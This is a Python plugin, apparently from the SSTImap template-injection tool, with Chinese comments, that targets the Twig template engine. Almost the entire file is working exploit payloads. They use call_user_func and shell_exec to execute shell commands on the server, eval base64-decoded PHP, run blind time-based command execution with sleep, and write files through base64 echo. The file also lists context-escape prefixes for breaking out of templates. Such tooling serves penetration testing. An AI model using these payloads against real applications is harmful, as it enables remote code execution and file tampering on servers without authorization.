from plugins.languages import php
from core import bash
from utils import rand


class Twig(php.Php):
    priority = 5
    plugin_info = {
        "Description": 'Twig 模板引擎版本 >=1.41、>=2.10 和 >=3.0',
        "Authors": [
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Twig >=1.41、>=2.10 和 >=3.0 的自动负载
            "Emilio @epinna https://github.com/epinna",  # 适用于旧版本 Twig 的原始 Tplmap 载荷
        ],
        "Engine": [
            "Homepage: https://twig.symfony.com/",
            "Github: https://github.com/twigphp/Twig",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                # 禁用错误，以便“系统”不会通过警告破坏输出
                'header': '{{% for a in {{"0":"error_reporting"}}|map("ini_set") %}}{{% endfor %}}{{{{{header[0]}+{header[1]}}}}}',
                'trailer': '{{{{{trailer[0]}+{trailer[1]}}}}}',
                # {{7*'7'}} 和 a{#b#}c 也可以在 freemarker 中使用
                # {% set a=%i*%i %}{{a}} 也适用于 Nunjucks
                'test_render': f'{{{{(1..3)|filter(x => x < 3)|join("")}}}}{{{{"{rand.randstrings[0]}\n"|nl2br}}}}',
                'test_render_expected': f'12{rand.randstrings[0]}<br />'
            },
            'render_error': {
                'render': '{code}',
                'header': '{{%set h={header[0]}+{header[1]}%}}',
                # Body需要设置b作为输出
                'trailer': '{{%set t={trailer[0]}+{trailer[1]}%}}{{{{include([h,b,t]|join)}}}}',
                'test_render': f'{{%set a=(1..3)|filter(x => x < 3)|join("")%}}{{%set b=[a,"{rand.randstrings[0]}"]|join%}}',
                'test_render_expected': f'12{rand.randstrings[0]}'
            },
            # 评估 PHP 代码的黑客方法
            'evaluate': {
                'call': 'execute',
                'evaluate': """php -r 'eval(base64_decode("{code_b64p}"));'""",
                'test_os': 'echo PHP_OS;',
                'test_os_expected': r'^[\w-]+$'
            },
            'evaluate_boolean': {
                'call': 'execute_blind',
                'evaluate_blind': """php -r '1 / (true && eval("return (" . base64_decode("{code_b64p}") . ");"));'""",
            },
            'evaluate_blind': {
                'call': 'execute',
                'evaluate_blind': """php -r 'eval("return (" . base64_decode("{code_b64p}") . ") && sleep({delay});");'"""
            },
            'execute': {
                'call': 'render',
                'execute': """{{%set p={{"{code_b64p}":"base64_decode"}}|map("call_user_func")|join%}}{{{{ {{(p):"shell_exec"}}|map("call_user_func")|join }}}}""",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2]
            },
            'execute_error': {
                'execute': """{{%set p={{"{code_b64p}":"base64_decode"}}|map("call_user_func")|join%}}{{%set b={{(p):"shell_exec"}}|map("call_user_func")|join%}}""",
            },
            # 检查成功的黑客方法
            'execute_boolean': {
                'call': 'inject',
                'execute_blind': """{{%set p={{"{code_b64p}":"base64_decode"}}|map("call_user_func")|join%}}{{{{ 1 / ({{(p):"shell_exec"}}|map("call_user_func")|join|trim('\\n') ends with "SSTIMAP") }}}}"""
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """{{%set p={{"{code_b64p}":"base64_decode"}}|map("call_user_func")|join%}}{{{{ {{([p, "&& sleep {delay}"]|join):"shell_exec"}}|map("call_user_func")|join }}}}"""
            },
            'write': {
                'call': 'inject',
                'write': """{{{{ {{"echo -n '{chunk_b64p}'|base64 -d>>{path}":"shell_exec"}}|map("call_user_func")|join }}}}""",
                'truncate': """{{{{ {{"echo -n >{path}":"shell_exec"}}|map("call_user_func")|join }}}}"""
            },
        })

        self.set_contexts([
            # 文本上下文，无闭包
            {'level': 0},
            {'level': 1, 'prefix': '{closure}}}}}', 'suffix': '{{1', 'closures': php.ctx_closures},
            {'level': 1, 'prefix': '{closure} %}}', 'suffix': '', 'closures': php.ctx_closures},
            {'level': 2, 'prefix': '#}}', 'suffix': '{#'},
            {'level': 5, 'prefix': '{closure} %}}{{% endfor %}}{{% for a in [1] %}}', 'suffix': '',
             'closures': php.ctx_closures},
            # 这会转义字符串“inter#{”asd”}polation”
            {'level': 5, 'prefix': '{closure}}}', 'suffix': '', 'closures': php.ctx_closures},
            # 这会转义字符串 {% set %s = 1 %}
            {'level': 5, 'prefix': '{closure} = 1 %}}', 'suffix': '', 'closures': php.ctx_closures},
        ])
